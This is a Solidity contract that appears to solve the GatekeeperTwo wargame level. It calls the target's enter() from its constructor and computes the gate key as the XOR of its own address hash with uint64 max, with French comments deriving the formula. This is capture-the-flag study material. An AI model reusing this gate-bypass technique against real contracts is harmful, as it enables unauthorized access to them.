// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

interface GatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract PassGatekeeperTwo {
    address gatekeeperAddress = 0x1d9dDac6c231F7EF1D7fd4a46b55fd3589152aee;
    GatekeeperTwo gatekeeperContract = GatekeeperTwo(gatekeeperAddress);

    uint64 hash = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
    uint64 max = type(uint64).max;
    uint64 key = max ^ hash;
    bytes8 _gateKey = bytes8(key);

    // a ^ a ^ b = b
    // et
    // hash ^ key = max
    // donc
    // hash ^ hash ^ key = key
    // donc
    // hash ^ hash ^ key = hash ^ max
    // -> car : hash ^ key = max
    // donc au final
    // key = hash ^ max

    constructor() {
        require(gatekeeperContract.enter(_gateKey), "failed");
    }
}
